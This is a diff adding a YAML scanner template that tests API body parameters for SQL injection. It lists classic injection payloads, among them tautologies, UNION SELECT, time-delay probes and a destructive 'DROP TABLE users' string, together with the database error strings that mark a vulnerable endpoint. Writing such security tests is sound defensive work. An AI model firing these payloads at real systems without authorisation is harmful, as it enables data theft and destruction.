@@ -1,0 +1,126 @@
+id: SQL_INJECTION_BY_BODY_PARAM
+info:
+  name: "SQL Injection via Body Parameters"
+  description: "Tests for SQL injection vulnerabilities by injecting classic SQL payloads into request body parameters."
+  details: >
+    "SQL injection occurs when user-supplied input is incorporated into SQL queries without
+    proper sanitization. This test injects classic SQL payloads (single quotes, OR 1=1,
+    UNION SELECT, comment sequences) into body parameters. A vulnerable endpoint may return
+    database error messages, unexpected data rows, or altered application behavior."
+  impact: "Successful SQL injection enables attackers to read sensitive data, bypass
+    authentication, modify or delete database records, and in some configurations execute
+    operating system commands, resulting in complete system compromise."
+  category:
+    name: INJECTION_ATTACKS
+    shortName: Injection
+    displayName: Injection Attacks
+  subCategory: SQL_INJECTION_BY_BODY_PARAM
+  severity: CRITICAL
+  tags:
+    - OWASP top 10
+    - Business logic
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-community/attacks/SQL_Injection"
+    - "https://cwe.mitre.org/data/definitions/89.html"
+  cwe:
+    - CWE-89
+  cve:
+    - CVE-2023-23752
+
+attributes:
+  nature: INTRUSIVE
+  plan: FREE
+  duration: FAST
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    neq: "OPTIONS"
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+      - "syntax error"
+      - "SQL syntax"
+      - "mysql_fetch"
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: ".*"
+          value:
+            datatype: string
+            extract: payloadKey
+
+wordLists:
+  sqlPayloads:
+    - "'"
+    - "'' OR '1'='1"
+    - "1 OR 1=1"
+    - "1; DROP TABLE users--"
+    - "1 UNION SELECT NULL,NULL--"
+    - "admin'--"
+    - "1' AND '1'='1"
+    - "\" OR \"1\"=\"1"
+    - "1 AND SLEEP(5)--"
+    - "1 WAITFOR DELAY '0:0:5'--"
+
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_body_param:
+            payloadKey: "'"
+        - modify_body_param:
+            payloadKey: "'' OR '1'='1"
+        - modify_body_param:
+            payloadKey: "1 OR 1=1"
+        - modify_body_param:
+            payloadKey: "1 UNION SELECT NULL,NULL--"
+        - modify_body_param:
+            payloadKey: "admin'--"
+        - modify_body_param:
+            payloadKey: "1 AND SLEEP(5)--"
+
+validate:
+  response_payload:
+    contains_either:
+      - "syntax error"
+      - "SQL syntax"
+      - "mysql_fetch"
+      - "ORA-"
+      - "pg_query"
+      - "sqlite3"
+      - "Unclosed quotation"
+      - "SQLSTATE"
+      - "supplied argument is not"
+      - "You have an error in your SQL"
